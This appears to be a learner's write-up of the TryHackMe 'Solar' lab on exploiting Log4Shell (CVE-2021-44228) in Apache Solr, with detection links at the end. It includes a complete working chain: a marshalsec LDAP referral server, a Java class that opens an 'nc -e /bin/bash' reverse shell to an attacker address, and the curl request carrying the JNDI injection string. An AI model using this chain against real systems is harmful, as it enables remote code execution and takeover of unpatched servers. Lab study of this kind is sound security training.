# Solar, exploiting log4j
Explore CVE-2021-44228, a vulnerability in log4j affecting almost all software under the sun

https://tryhackme.com/room/solar

This room is about the so called log4JShell
## Resources
- https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
- https://log4shell.huntress.com/
- https://www.youtube.com/watch?v=7qoPDq41xhQ
- https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI- LDAP-Manipulation-To-RCE.pdf
- https://youtu.be/OJRqyCHheRE showcase
- https://github.com/mbechler/marshalsec


### Notes for Task 4
scanning target machine and look for open ports
```
PORT     STATE SERVICE REASON  VERSION
8983/tcp open  http    syn-ack Apache Solr
| http-title: Solr Admin
|_Requested resource was http://10.10.49.80:8983/solr/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: ED7D5C39C69262F4BA95418D4F909B10
```
my ip address:
`ip -br -c a`
10.0.2.15

open an netcat listner on port 9999
`nc -lnvp 9999`

hmpf. in my kali vm i didn't get anything back.
Trying it in attackbox then I got a connection back. 

:(

go forward with the attackbox
## Task 5 Exploitation

build the marshalsec tool which is located /Rooms/solar/marshalsec  
`mvn clean package -DskipTests`


start LDAP Server    
`java -cp target/marshalsec-0.0-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://10.10.137.212:8000/#Exploit` 
Listening on 0.0.0.0:1389 

Programm the payload for the reverse shell.  
```
public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
compile  
`javac Exploit.java -source 8 -target 8`

start http server to host payload
`python3 -m http.server` 

open a new terminal and trigger the exploit  
`curl 'http://10.10.82.10:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.137.212:1389/Exploit\}'
`
* Hurra we have a reverse shell *

When you run the curl command to trigger the exploit, you should sequentially see:

1. A connection made on your LDAP server,
2. A connection made on your HTTP server,
3. A connection made in your netcat listener.

Once you receive a connection, you may not see a "prompt." You can still enter commands to check if you do have the shell.


## Task 6 Persistence
try to find out some users and credentials to get access to victim via ssh.

`whoami` -> solr




Below are snippets that might help either effort:

    https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes (local, based off hashes of log4j JAR files)
    https://gist.github.com/olliencc/8be866ae94b6bee107e3755fd1e9bf0d (local, based off hashes of log4j CLASS files)
    https://github.com/nccgroup/Cyber-Defence/tree/master/Intelligence/CVE-2021-44228 (listing of vulnerable JAR and CLASS hashes)
    https://github.com/omrsafetyo/PowerShellSnippets/blob/master/Invoke-Log4ShellScan.ps1 (local, hunting for vulnerable log4j packages in PowerShell)
    https://github.com/darkarnium/CVE-2021-44228 (local, YARA rules)

As a reminder, a massive resource is available here: 

https://www.reddit.com/r/sysadmin/comments/reqc6f/log4j_0day_being_exploited_mega_thread_overview/
